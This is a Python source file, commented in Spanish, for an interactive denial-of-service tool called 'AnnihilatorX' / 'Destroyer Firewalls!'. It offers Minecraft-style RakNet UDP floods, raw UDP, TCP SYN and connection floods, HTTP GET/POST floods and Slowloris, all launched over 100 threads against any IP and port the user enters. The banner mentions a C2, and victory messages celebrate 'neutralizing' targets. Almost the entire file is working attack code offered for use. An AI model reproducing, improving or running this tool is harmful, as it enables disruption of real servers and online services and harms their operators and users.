import socket
import threading
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# --- Banner y Textos Mejorados ---
BANNER = r"""
:::    ::: :::   ::: ::::::::: :::::::::::
:+:    :+: :+:   :+: :+:    :+:    :+:
+:+    +:+  +:+ +:+  +:+    +:+    +:+
+#++:++#++   +#++:   +#++:++#+     +#+
+#+    +#+    +#+    +#+           +#+
#+#    #+#    #+#    #+#           #+#
###    ###    ###    ###       ###########
"""
TITLE = "Destroyer Firewalls!"
DEV_INFO = "Developer: [Learn & Xyxint] "
WARNING_TEXT = Fore.RED + Style.BRIGHT + "do not attack gov/mil/shool or you will be blocked from C2..."

# --- Configuración del Ataque ---
MAX_ATTACK_TIME = 600  # Aumentado
PACKET_SIZE = 65507    # Máximo teórico para UDP sin fragmentar (payload)
NUM_THREADS = 100     # AUMENTADO - ¡CUIDADO! Puede saturar TU conexión/CPU
MAX_PPS_PER_THREAD = 2000 # AUMENTADO PPS objetivo por hilo - ¡CUIDADO!

# Lista de User-Agents para ataques HTTP
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18"
]

METHODS = [
    # Originales MCPE
    "UDPPPS", "UDPGOOD", "UDPPACKETS", "UDPNUCLEAR", "UDPBOTNET", "UDPGAME", "MAXIMUM_OVERDRIVE",
    # Genéricos
    "UDPRAW",      # Flood UDP con payload aleatorio grande
    "TCP-SYN",     # Inundación de SYN (simulada, inicia conexión)
    "TCP-CONN",    # Inundación de conexiones TCP completas
    "HTTP-GET",    # Flood de peticiones HTTP GET
    "HTTP-POST",   # Flood de peticiones HTTP POST (payload pequeño)
    "SLOWLORIS",   # Ataque Slowloris para agotar conexiones HTTP
    # "TCP-XMAS",    # Experimental: Inundación TCP con flags Xmas (difícil sin raw sockets)
    # "TCP-NULL",    # Experimental: Inundación TCP con flags NULL
    # "TCP-FIN",     # Experimental: Inundación TCP con flags FIN
]

attacking = False
attack_threads = []
slowloris_sockets = [] # Para gestionar sockets de Slowloris

MCPE_RAKNET_MAGIC = bytes.fromhex("00ffff00fefefefefefdfdfdfd12345678")
MCPE_PACKET_TYPES = [b"\x01", b"\x05", b"\x06", b"\x07", b"\x08"]
MCPE_PREFIXES = [b"\x8e", b"\x84", b"\x96", b"\xa0", b"\x9b", b"\x45"]
SERVER_HANDSHAKE_HEADERS = [b"\x05\x00\x00\x00\x00", b"\x06\x00\x00\x00\x00\x00", b"\x03\x00\x00\x00"]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header():
    clear_screen()
    print(Fore.CYAN + Style.BRIGHT + BANNER)
    print(Fore.MAGENTA + Style.BRIGHT + TITLE.center(70))
    print(Style.RESET_ALL + DEV_INFO.center(70))
    print(WARNING_TEXT.center(80))
    print(Fore.GREEN + "=" * 70)

def show_methods():
    print(Fore.YELLOW + Style.BRIGHT + "\n🔥 Métodos de Ataque Ultra Disponibles 🔥:")
    methods_per_line = 2 # Para que quepan más en pantalla
    for i, method in enumerate(METHODS):
        color = Fore.RED if i % 2 == 0 else Fore.WHITE
        print(color + Style.BRIGHT + f"  [{i+1}] {method}".ljust(35), end="") # Ajustado el ljust
        if (i + 1) % methods_per_line == 0 or i == len(METHODS) - 1:
            print()
    print("\n" + Style.RESET_ALL + Fore.GREEN + "=" * 70)

def generate_payload(size):
    return os.urandom(min(size, PACKET_SIZE - 42)) # 42 para otros encabezados

def generate_mcpe_packet(method):
    if method == "MAXIMUM_OVERDRIVE":
        header = random.choice(SERVER_HANDSHAKE_HEADERS)
        prefix = random.choice(MCPE_PREFIXES)
        extra_junk = os.urandom(random.randint(200, 800)) # Más junk
        payload_size = PACKET_SIZE - len(MCPE_RAKNET_MAGIC) - len(header) - len(prefix) - len(extra_junk) - 20
        payload = generate_payload(max(4096, payload_size)) # Payload grande
        return MCPE_RAKNET_MAGIC + header + prefix + extra_junk + payload
    elif method == "UDPPPS":
        return MCPE_RAKNET_MAGIC + random.choice(MCPE_PACKET_TYPES) + generate_payload(1024)
    elif method == "UDPGOOD":
        handshake = SERVER_HANDSHAKE_HEADERS[0]
        return MCPE_RAKNET_MAGIC + handshake + generate_payload(2048)
    elif method == "UDPPACKETS":
        handshake = SERVER_HANDSHAKE_HEADERS[1]
        fragment_id = random.randint(0, 65535).to_bytes(2, byteorder='big')
        return MCPE_RAKNET_MAGIC + b"\x84" + fragment_id + generate_payload(PACKET_SIZE - 100) # Paquetes grandes
    elif method == "UDPNUCLEAR":
        handshake = random.choice(SERVER_HANDSHAKE_HEADERS)
        prefix_combo = random.choice(MCPE_PREFIXES) + os.urandom(10) # Más combo
        return MCPE_RAKNET_MAGIC + handshake + prefix_combo + generate_payload(PACKET_SIZE - 50) # Casi lleno
    elif method == "UDPBOTNET":
        client_id = random.randint(1000, 9999).to_bytes(4, byteorder='big')
        handshake = SERVER_HANDSHAKE_HEADERS[2] + client_id
        return MCPE_RAKNET_MAGIC + handshake + b"\x08" + generate_payload(PACKET_SIZE - 30) # Muy lleno
    elif method == "UDPGAME":
        world_chunk_request = b"\x87" + random.randint(0, 65535).to_bytes(2, byteorder='big')
        entity_data = b"\x91" + random.randint(0, 1000000).to_bytes(4, byteorder='big')
        return MCPE_RAKNET_MAGIC + world_chunk_request + entity_data + generate_payload(PACKET_SIZE - 20) # Full
    else: # Fallback para métodos UDP no MCPE
        return generate_payload(PACKET_SIZE - len(MCPE_RAKNET_MAGIC))


def flood_worker(target_ip, target_port, end_time, method_name):
    global attacking, slowloris_sockets
    sock = None
    local_slowloris_sockets = [] # Sockets para este hilo de slowloris

    try:
        packets_sent_this_second = 0
        current_second_start_time = time.monotonic()

        # --- UDP Based Attacks ---
        if method_name.startswith("UDP"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            # SO_SNDBUF puede ayudar un poco, pero el OS tiene la última palabra
            try: sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535 * 20) # Intentar buffer más grande
            except: pass

            cached_packets = [generate_mcpe_packet(method_name) if "MCPE" in method_name or method_name in ["UDPPPS", "UDPGOOD", "UDPPACKETS", "UDPNUCLEAR", "UDPBOTNET", "UDPGAME", "MAXIMUM_OVERDRIVE"] else os.urandom(random.randint(1024, PACKET_SIZE - 28)) for _ in range(10)]

            while time.time() < end_time and attacking:
                try:
                    if packets_sent_this_second % 20 == 0: # Regenerar caché a menudo
                         cached_packets = [generate_mcpe_packet(method_name) if "MCPE" in method_name or method_name in ["UDPPPS", "UDPGOOD", "UDPPACKETS", "UDPNUCLEAR", "UDPBOTNET", "UDPGAME", "MAXIMUM_OVERDRIVE"] else os.urandom(random.randint(1024, PACKET_SIZE - 28)) for _ in range(10)]
                    
                    packet = random.choice(cached_packets)
                    sock.sendto(packet, (target_ip, target_port))
                    packets_sent_this_second += 1

                    time_now = time.monotonic()
                    if time_now - current_second_start_time >= 1.0:
                        packets_sent_this_second = 0
                        current_second_start_time = time_now
                    elif packets_sent_this_second >= MAX_PPS_PER_THREAD:
                        sleep_needed = (current_second_start_time + 1.0) - time_now
                        if sleep_needed > 0:
                            time.sleep(sleep_needed) # Dormir el resto del segundo
                        packets_sent_this_second = 0
                        current_second_start_time = time.monotonic()

                except BlockingIOError:
                    time.sleep(0.00001) # Muy corta espera si el buffer está lleno
                except socket.error:
                    time.sleep(0.001)
                except Exception:
                    time.sleep(0.01)

        # --- TCP Based Attacks ---
        elif method_name.startswith("TCP-"):
            while time.time() < end_time and attacking:
                sock_tcp = None
                try:
                    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock_tcp.settimeout(0.5) # Timeout corto para no colgarse mucho

                    if method_name == "TCP-SYN":
                        # connect() envía SYN. No necesitamos hacer más para un SYN flood básico.
                        sock_tcp.connect((target_ip, target_port))
                        # Podríamos enviar un RST inmediatamente, pero connect() y close() es más simple
                        # sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))

                    elif method_name == "TCP-CONN":
                        sock_tcp.connect((target_ip, target_port))
                        # Mantener la conexión. El hilo simplemente duerme y el socket se cierra al final.
                        # Para hacerlo más "ruidoso", podríamos enviar datos pequeños periódicamente.
                        # sock_tcp.sendall(os.urandom(random.randint(1,16)))
                        # Este método es más efectivo si muchos hilos mantienen conexiones abiertas.
                        # El socket se cerrará cuando el hilo termine o en el finally.
                        # Para un verdadero flood de conexiones, necesitaríamos gestionar una lista de sockets activos.
                        # Esta es una simplificación: abre, espera un poco, cierra, repite.
                        time.sleep(random.uniform(0.1, 0.5)) # Mantener un poco abierta


                    # --- Experimental TCP Flag Floods (requieren un manejo más cuidadoso y a menudo raw sockets para ser efectivos) ---
                    # La efectividad de esto sin raw sockets es dudosa, ya que el OS maneja el stack TCP.
                    # elif method_name == "TCP-XMAS":
                    #     sock_tcp.connect((target_ip, target_port))
                    #     # Intentar enviar datos con flags inusuales (Python no da control directo de flags en sockets std)
                    #     # Esto es más una conexión normal que un verdadero XMAS packet
                    #     sock_tcp.sendall(b"\x29" + os.urandom(random.randint(10,50))) # 0x29 = URG, PSH, FIN
                    # elif method_name == "TCP-NULL":
                    #     sock_tcp.connect((target_ip, target_port))
                    #     sock_tcp.sendall(b"\x00" + os.urandom(random.randint(10,50))) # Payload con byte nulo
                    # elif method_name == "TCP-FIN":
                    #     sock_tcp.connect((target_ip, target_port))
                    #     # Al cerrar se envía FIN, pero queremos enviar FIN repetidamente.
                    #     # sock_tcp.shutdown(socket.SHUT_WR) # Envía FIN

                    packets_sent_this_second += 1 # Contamos conexiones intentadas/hechas como "paquetes"
                    time_now = time.monotonic()
                    if time_now - current_second_start_time >= 1.0:
                        packets_sent_this_second = 0
                        current_second_start_time = time_now
                    elif packets_sent_this_second >= (MAX_PPS_PER_THREAD / 10): # Menos "PPS" para TCP ya que son más costosos
                        sleep_needed = (current_second_start_time + 1.0) - time_now
                        if sleep_needed > 0: time.sleep(sleep_needed)
                        packets_sent_this_second = 0
                        current_second_start_time = time.monotonic()

                except (socket.error, socket.timeout):
                    pass # Ignorar errores de conexión, es esperado en un flood
                except Exception:
                    pass
                finally:
                    if sock_tcp:
                        try: sock_tcp.close()
                        except: pass
                if not attacking: break # Salir si el ataque se detuvo

        # --- HTTP Based Attacks ---
        elif method_name.startswith("HTTP-") or method_name == "SLOWLORIS":
            http_port = target_port if target_port else 80 # Default HTTP port
            
            if method_name == "SLOWLORIS":
                # Número de sockets por hilo para Slowloris
                num_slowloris_sockets_per_thread = 50 # Puede ser alto
                
                for _ in range(num_slowloris_sockets_per_thread):
                    if not attacking or time.time() >= end_time: break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target_ip, http_port))
                        path = f"/?{random.randint(0, 99999)}"
                        s.send(f"GET {path} HTTP/1.1\r\n".encode("utf-8"))
                        s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
                        s.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
                        # s.send("Connection: Keep-Alive\r\n".encode("utf-8")) # Implícito en HTTP/1.1
                        local_slowloris_sockets.append(s)
                        with threading.Lock(): # Proteger acceso a lista global
                            slowloris_sockets.append(s)
                    except (socket.error, socket.timeout):
                        continue # No pudo conectar, intentar con el siguiente
                    except Exception:
                        continue
                
                # Bucle para mantener vivas las conexiones Slowloris
                while time.time() < end_time and attacking and local_slowloris_sockets:
                    for s in list(local_slowloris_sockets): # Iterar sobre una copia
                        try:
                            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                            time.sleep(random.uniform(0.1, 0.5)) # Pequeña pausa entre envíos de headers
                        except socket.error:
                            local_slowloris_sockets.remove(s)
                            with threading.Lock():
                                if s in slowloris_sockets: slowloris_sockets.remove(s)
                            try: s.close()
                            except: pass
                    time.sleep(random.uniform(5, 15)) # Intervalo para enviar keep-alives (más largo)
                
            else: # HTTP-GET, HTTP-POST
                while time.time() < end_time and attacking:
                    sock_http = None
                    try:
                        sock_http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock_http.settimeout(1.0) # Timeout para conexión y envío
                        sock_http.connect((target_ip, http_port))
                        
                        path = f"/{os.urandom(6).hex()}?{os.urandom(4).hex()}={os.urandom(4).hex()}"
                        ua = random.choice(USER_AGENTS)
                        
                        if method_name == "HTTP-GET":
                            request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nConnection: close\r\n\r\n"
                        elif method_name == "HTTP-POST":
                            # Payload pequeño para POST, el objetivo es sobrecargar el handling del request
                            post_data = f"data={os.urandom(random.randint(16,128)).hex()}"
                            request = f"POST {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\nConnection: close\r\n\r\n{post_data}"
                        
                        sock_http.sendall(request.encode("utf-8"))
                        # Opcional: intentar leer respuesta para que parezca más legítimo, pero ralentiza
                        # sock_http.recv(128) 

                        packets_sent_this_second += 1
                        time_now = time.monotonic()
                        if time_now - current_second_start_time >= 1.0:
                            packets_sent_this_second = 0
                            current_second_start_time = time_now
                        elif packets_sent_this_second >= (MAX_PPS_PER_THREAD / 5): # HTTP es más lento
                            sleep_needed = (current_second_start_time + 1.0) - time_now
                            if sleep_needed > 0: time.sleep(sleep_needed)
                            packets_sent_this_second = 0
                            current_second_start_time = time.monotonic()

                    except (socket.error, socket.timeout):
                        pass
                    except Exception:
                        pass
                    finally:
                        if sock_http:
                            try: sock_http.close()
                            except: pass
                    if not attacking: break
    
    except Exception:
        # Error al crear el socket o un error crítico inicial
        pass 
    finally:
        if sock: # Para UDP
            try: sock.close()
            except: pass
        # Cerrar sockets de Slowloris de este hilo
        for s_loris in local_slowloris_sockets:
            try: s_loris.close()
            except: pass
            with threading.Lock():
                if s_loris in slowloris_sockets: # Asegurar que se quite de la lista global
                    slowloris_sockets.remove(s_loris)


def start_attack(ip, port, duration, method):
    global attacking, attack_threads, slowloris_sockets
    
    if method.upper() not in METHODS:
        print(Fore.RED + Style.BRIGHT + f"Método '{method}' no válido. Usa '.methods' para ver la lista.")
        return

    if duration <=0 :
        print(Fore.RED + Style.BRIGHT + f"La duración debe ser mayor a 0 segundos.")
        return
    duration = min(duration, MAX_ATTACK_TIME)


    try:
        target_port = int(port)
        if not (1 <= target_port <= 65535):
            # Para HTTP/Slowloris, el puerto 0 podría indicar default (80), pero mejor ser explícito
            if method.upper() in ["HTTP-GET", "HTTP-POST", "SLOWLORIS"] and target_port == 0:
                target_port = 80 # Default HTTP
            else:
                raise ValueError("Puerto fuera de rango")
    except ValueError:
        print(Fore.RED + Style.BRIGHT + "Puerto inválido. Debe ser un número entre 0 y 65535 (0 para default HTTP/S).")
        return

    try:
        # Validar IP. Si es un hostname, intentar resolverlo primero (fuera de este scope simple)
        # Aquí asumimos que es una IP. Para hostnames, necesitarías socket.gethostbyname()
        socket.inet_aton(ip) 
    except socket.error:
        print(Fore.RED + Style.BRIGHT + "Dirección IP inválida.")
        return

    if attacking:
        print(Fore.YELLOW + "Un ataque ya está en curso. Deténlo primero (.stop) o espera a que termine.")
        return

    attacking = True
    attack_threads = []
    slowloris_sockets.clear() # Limpiar sockets de Slowloris de ataques anteriores
    
    end_time = time.time() + duration
    
    clear_screen()
    print(Fore.RED + Style.BRIGHT + BANNER)
    print(Fore.CYAN + Style.BRIGHT + f"\n🚀 Iniciando MASACRE {method.upper()} a {ip}:{target_port} por {duration} segundos... 🚀")
    print(Fore.YELLOW + f"Objetivo: {NUM_THREADS} Hilos, {MAX_PPS_PER_THREAD} PPS/Hilo. ¡ANNIHILATION!")
    print(Fore.RED + Style.BRIGHT + "Presiona Ctrl+C para intentar detener la devastación.")
    print(Fore.GREEN + "=" * 70)

    for i in range(NUM_THREADS):
        thread = threading.Thread(target=flood_worker, args=(ip, target_port, end_time, method.upper()), daemon=True)
        attack_threads.append(thread)
        thread.start()
        time.sleep(0.002) # Espaciado muy pequeño para evitar sobrecarga inicial

    try:
        spinner_chars = "🌑🌒🌓🌔🌕🌖🌗🌘" # Spinner más elaborado
        idx = 0
        while time.time() < end_time and attacking:
            elapsed_time = int(time.time() - (end_time - duration))
            remaining_time = int(end_time - time.time())
            print(f"\r{Fore.GREEN}Aniquilando... {spinner_chars[idx % len(spinner_chars)]} {Fore.YELLOW}Tiempo: {elapsed_time}s / {duration}s {Fore.RED}(Restante: {remaining_time}s){Style.RESET_ALL} (Ctrl+C para detener)", end="")
            idx += 1
            time.sleep(0.1)
        
        if attacking: # Si el bucle termina por tiempo
             print(f"\r{Fore.GREEN + Style.BRIGHT}Finalizando ataque programado... Cuenta atrás completada.".ljust(80))
    
    except KeyboardInterrupt:
        print(f"\r{Fore.YELLOW + Style.BRIGHT}\n[!] Ataque interrumpido por el usuario. ¡COBARDE!".ljust(80))
        attacking = False # Importante setear attacking a False aquí
    
    finally:
        attacking = False # Asegurar que attacking sea False
        print(Fore.BLUE + Style.BRIGHT + "\nEsperando que los hilos de aniquilación finalicen (puede tardar)...")
        
        # Cerrar sockets de Slowloris restantes globalmente
        if method.upper() == "SLOWLORIS":
            print(Fore.MAGENTA + "Cerrando sockets de Slowloris...")
            with threading.Lock():
                for s_loris in list(slowloris_sockets): # Iterar sobre copia
                    try: s_loris.close()
                    except: pass
                slowloris_sockets.clear()

        active_threads_before_join = sum(t.is_alive() for t in attack_threads)
        if active_threads_before_join > 0:
            print(f"{Fore.YELLOW}Hilos activos antes de join: {active_threads_before_join}")

        for t_idx, t in enumerate(attack_threads):
            t.join(timeout=1.5) # Timeout un poco más largo para permitir limpieza
            # if t_idx % 20 == 0: print(f"\r{Fore.BLUE}Procesando hilo {t_idx+1}/{len(attack_threads)}...", end="")
        # print("\r" + " " * 50 + "\r", end="") # Limpiar línea de progreso de hilos

        attack_threads.clear()
        
        active_threads_after_join = sum(t.is_alive() for t in threading.enumerate() if t in attack_threads) # Re-chequear
        
        if active_threads_after_join == 0:
             print(Fore.GREEN + Style.BRIGHT + "\n🔥🔥🔥 ¡ANNIHILACIÓN COMPLETADA CON ÉXITO! ¡OBJETIVO NEUTRALIZADO! 🔥🔥🔥")
        else:
            print(Fore.RED + Style.BRIGHT + f"\nAlgunos hilos ({active_threads_after_join}) no finalizaron correctamente. Puede que el objetivo aún sufra.")
        
        print(Fore.GREEN + "=" * 70)
        input(Fore.CYAN + "Presiona Enter para volver al menú de selección de víctimas...")


def main():
    global attacking, attack_threads, slowloris_sockets
    while True:
        display_header()
        show_methods()
        try:
            if attacking: 
                print(Fore.YELLOW + "\nUn ataque está actualmente en progreso. Espera o interrumpe.")
                while attacking: # Bucle de espera pasivo
                    time.sleep(0.5)
                    # Comprobar si los hilos han terminado por su cuenta (p.ej. tiempo agotado)
                    if not any(t.is_alive() for t in attack_threads) and attack_threads:
                        print(Fore.GREEN + "El ataque en curso parece haber finalizado por tiempo.")
                        attacking = False # Actualizar estado
                        attack_threads.clear()
                        slowloris_sockets.clear()
                        break
                time.sleep(1) # Pausa antes de repintar
                continue 

            prompt_text = f"{Fore.BLUE}AnnihilatorX ({Fore.RED}Overlord{Fore.BLUE})~#{Style.RESET_ALL} "
            command_input = input(prompt_text).strip()
            
            if not command_input:
                continue

            parts = command_input.split()
            command = parts[0].lower()

            if command in [".exit", "exit", "quit", "salir"]:
                print(Fore.YELLOW + "Desactivando AnnihilatorX Ultra Edition...")
                if attacking:
                    print(Fore.MAGENTA + "Intentando detener hilos de ataque activos antes de salir...")
                    attacking = False
                    for s_loris in list(slowloris_sockets):
                        try: s_loris.close()
                        except:pass
                    slowloris_sockets.clear()
                    for t in attack_threads:
                        if t.is_alive(): t.join(timeout=0.5)
                    attack_threads.clear()
                break
            
            elif command in [".cls", "clear", "limpiar"]:
                pass # Se limpia al inicio del bucle
            
            elif command == ".methods":
                pass # Se muestran al inicio del bucle
            
            elif command == ".stop":
                if attacking:
                    print(Fore.YELLOW + Style.BRIGHT + "[!] ABORTANDO MISIÓN. Intentando detener el ataque actual...")
                    attacking = False # Esto debería hacer que los bucles de los hilos terminen
                    # La limpieza de sockets de slowloris y join de hilos se maneja en el finally de start_attack
                    # o aquí si se interrumpe desde el menú principal.
                    print(Fore.BLUE + Style.BRIGHT + "Esperando que los hilos respondan a la señal de detención...")
                    
                    # Forzar cierre de sockets de slowloris si es el caso
                    current_method_type = "" # Necesitaríamos saber el método actual
                    # Este es un punto débil, si el .stop se llama desde aquí, no conocemos el método
                    # para hacer una limpieza específica de slowloris_sockets.
                    # La bandera 'attacking = False' es la principal señal.

                    # Esperar un poco para que los hilos terminen
                    time.sleep(2) # Dar tiempo a los hilos para que se den cuenta
                    
                    threads_still_alive = 0
                    for t_idx, t in enumerate(list(attack_threads)): # Iterar sobre copia
                        if t.is_alive():
                            # t.join(timeout=0.1) # Un join muy corto para no bloquear mucho aquí
                            threads_still_alive +=1
                    
                    if threads_still_alive == 0:
                         print(Fore.GREEN + "Todos los hilos de ataque parecen haber sido detenidos.")
                    else:
                         print(Fore.RED + f"{threads_still_alive} hilos aún podrían estar activos. El finally de la función de ataque intentará limpiarlos.")
                    # attack_threads.clear() # No limpiar aquí, el 'finally' de start_attack lo hará
                else:
                    print(Fore.CYAN + "No hay ningún holocausto en curso para detener.")
                time.sleep(1)
            
            elif command in ["/attack", "attack", "atacar"]:
                if len(parts) >= 5: # /attack <ip> <port> <time> <method_name_or_number> [params...]
                    _, ip, port_str, time_str, method_input = parts[0:5]
                    
                    try:
                        method_to_use = ""
                        if method_input.isdigit():
                            method_index = int(method_input) - 1
                            if 0 <= method_index < len(METHODS):
                                method_to_use = METHODS[method_index]
                            else:
                                print(Fore.RED + f"Número de método inválido. Rango: 1-{len(METHODS)}.")
                                continue
                        elif method_input.upper() in METHODS:
                            method_to_use = method_input.upper()
                        else:
                            print(Fore.RED + f"Método '{method_input}' desconocido.")
                            # Sugerir método similar si es posible? (más complejo)
                            continue
                        
                        port_val = int(port_str)
                        duration_val = int(time_str)
                        
                        start_attack(ip, port_val, duration_val, method_to_use)

                    except ValueError:
                        print(Fore.RED + Style.BRIGHT + "Error: El puerto y el tiempo deben ser números válidos.")
                        print(Fore.YELLOW + "Ej: /attack 1.2.3.4 80 60 HTTP-GET")
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + f"Error catastrófico procesando el comando de ataque: {e}")
                else:
                    print(Fore.RED + "Uso: /attack <ip> <puerto> <tiempo_s> <metodo_o_numero>")
                    print(Fore.YELLOW + f"Ej1: /attack 1.2.3.4 19132 60 UDPNUCLEAR")
                    print(Fore.YELLOW + f"Ej2: /attack 1.2.3.4 80 120 11 (para HTTP-GET si es el método 11)")
            else:
                print(Fore.RED + f"Comando desconocido: '{command_input}'. Comandos válidos: /attack, .methods, .stop, .exit, .cls")
            
            if command != "/attack" and not attacking: time.sleep(0.2)

        except KeyboardInterrupt:
            if attacking:
                print(Fore.YELLOW + Style.BRIGHT + "\n[!] INTERRUPCIÓN GLOBAL CRÍTICA. ¡DETENIENDO LA OFENSIVA!")
                attacking = False
                # El 'finally' en start_attack debería manejar la limpieza de hilos.
                # Pero si estamos en el bucle principal, es posible que start_attack haya terminado.
                # Por si acaso, intentamos un cleanup básico aquí.
                print(Fore.MAGENTA + "Forzando detención de hilos y sockets...")
                with threading.Lock():
                    for s_loris in list(slowloris_sockets):
                        try: s_loris.close()
                        except: pass
                    slowloris_sockets.clear()
                
                for t in list(attack_threads): # Iterar sobre copia
                    if t.is_alive():
                        t.join(timeout=0.5) # Darles una oportunidad de cerrar limpiamente
                attack_threads.clear()
                print(Fore.GREEN + Style.BRIGHT + "Ataque interrumpido y (con suerte) detenido por el usuario.")
                input(Fore.CYAN + "Presiona Enter para continuar...")
            else:
                print(Fore.YELLOW + "\nSaliendo de AnnihilatorX por interrupción del usuario...")
                break
        except Exception as e:
            print(Fore.RED + Style.BRIGHT + f"\nError inesperado en el bucle principal: {e}")
            print(Fore.YELLOW + "Se recomienda reiniciar la herramienta.")
            # sys.exit(1) # Podrías salir si el error es muy grave

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"Error fatal al iniciar AnnihilatorX: {e}")
        print(Style.RESET_ALL + "El programa se cerrará.")
        sys.exit(1)
    finally:
        print(Style.RESET_ALL + "\nAnnihilatorX Ultra Edition ha finalizado su sesión. ¡Siembra el caos con responsabilidad!")
